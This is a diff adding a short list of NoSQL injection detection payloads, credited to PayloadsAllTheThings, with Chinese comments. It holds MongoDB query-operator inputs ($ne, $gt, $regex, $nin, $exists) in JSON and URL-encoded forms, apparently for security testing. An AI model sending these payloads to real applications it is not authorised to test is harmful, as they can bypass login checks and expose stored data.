@@ -1,0 +1,25 @@
+# NoSQL Injection Quick Detection Payloads
+# 来源: PayloadsAllTheThings NoSQL Injection
+# MongoDB/NoSQL快速检测payload
+
+# === 基础操作符注入 ===
+{"$ne": null}
+{"$ne": ""}
+{"$gt": ""}
+{"$gt": undefined}
+{"$regex": ".*"}
+{"$regex": "^"}
+{"$nin": []}
+{"$lt": "z"}
+{"$exists": true}
+
+# === URL编码形式 ===
+[$ne]=
+[$ne]=1
+[$gt]=
+[$gt]=1
+[$lt]=z
+[$regex]=.*
+[$regex]=^
+[$nin][]=
+[$exists]=true
